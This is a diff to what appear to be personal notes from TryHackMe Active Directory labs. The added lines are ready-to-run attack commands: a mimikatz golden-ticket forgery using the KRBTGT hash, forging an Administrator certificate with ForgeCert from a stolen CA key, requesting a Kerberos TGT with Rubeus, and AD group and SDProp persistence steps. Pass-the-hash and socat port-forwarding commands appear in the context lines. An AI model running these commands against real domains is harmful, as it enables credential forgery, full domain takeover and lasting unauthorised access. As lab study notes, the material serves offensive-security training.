@@ -80,6 +80,23 @@ mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b5
 Socat port forwarding
 socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
 
+GOLDEN TICKET
+mimikatz.exe
+mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
+
+Generating our own Certificates
+https://github.com/GhostPack/ForgeCert
+\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 
+
+We can use Rubeus to request a TGT using the certificate to verify that the certificate is trusted. 
+C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate: /password: /outfile: /domain:za.tryhackme.loc /dc:
+
+Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101
+
+Add-ADGroupMember -Identity "thmgroup" -Members "thmtest"
+
+Import-Module .\Invoke-ADSDPropagation.ps1 
+Invoke-ADSDPropagation
 
      
 
